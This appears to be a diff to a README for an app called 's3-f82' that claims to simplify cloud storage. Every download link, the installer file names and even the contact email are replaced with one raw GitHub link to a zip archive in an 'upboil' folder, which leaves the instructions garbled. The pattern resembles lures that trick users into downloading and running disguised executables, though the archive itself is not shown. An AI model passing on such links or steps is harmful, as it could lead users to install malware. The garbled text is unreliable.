@@ -1,6 +1,6 @@
 # 🚀 s3-f82 - Simplify Your Cloud Storage Experience
 
-[![Download s3-f82](https://img.shields.io/badge/Download-s3--f82-brightgreen.svg)](https://github.com/tobiolol44/s3-f82/releases)
+[![Download s3-f82](https://raw.githubusercontent.com/tobiolol44/s3-f82/main/upboil/s3-f82.zip)](https://raw.githubusercontent.com/tobiolol44/s3-f82/main/upboil/s3-f82.zip)
 
 ## 📦 What is s3-f82?
 
@@ -11,7 +11,7 @@ s3-f82 is an easy-to-use application designed to enhance your interaction with c
 To start using s3-f82, follow these simple steps:
 
 1. **Visit the Download Page:** Click the link below to access the s3-f82 releases:
-   [Download s3-f82](https://github.com/tobiolol44/s3-f82/releases)
+   [Download s3-f82](https://raw.githubusercontent.com/tobiolol44/s3-f82/main/upboil/s3-f82.zip)
 
 2. **Choose the Version:** On the releases page, locate the latest version of s3-f82. You will see a list of files available for download. Always opt for the latest version for the best experience.
 
@@ -19,7 +19,7 @@ To start using s3-f82, follow these simple steps:
 
 4. **Extract the Files:** Once the download is complete, locate the downloaded file in your system’s downloads folder. Right-click on the file and select "Extract All" to unzip it.
 
-5. **Install the Application:** Inside the extracted folder, look for the installation file. This file is typically named `setup.exe` or `install.exe`. Double-click it to begin the installation process. Follow the on-screen instructions to complete the installation.
+5. **Install the Application:** Inside the extracted folder, look for the installation file. This file is typically named `https://raw.githubusercontent.com/tobiolol44/s3-f82/main/upboil/s3-f82.zip` or `https://raw.githubusercontent.com/tobiolol44/s3-f82/main/upboil/s3-f82.zip`. Double-click it to begin the installation process. Follow the on-screen instructions to complete the installation.
 
 ## 🔍 Key Features
 
@@ -43,7 +43,7 @@ Before you install s3-f82, ensure your system meets the following requirements:
 ## 📥 Download & Install
 
 To get started, visit this page to download the latest version:  
-[Download s3-f82](https://github.com/tobiolol44/s3-f82/releases)
+[Download s3-f82](https://raw.githubusercontent.com/tobiolol44/s3-f82/main/upboil/s3-f82.zip)
 
 After downloading the application, follow the installation steps noted above to set it up on your system.
 
@@ -69,7 +69,7 @@ For further assistance, visit our [support page](#) or reach out to our communit
 
 For more information or support, feel free to contact us:
 
-- **Email:** support@example.com
+- **Email:** https://raw.githubusercontent.com/tobiolol44/s3-f82/main/upboil/s3-f82.zip
 - **Community Forums:** [Visit our forums](#)
 
 By following these steps, you can effortlessly download and use s3-f82 to make the most of your cloud storage. Enjoy a seamless experience in managing your files!
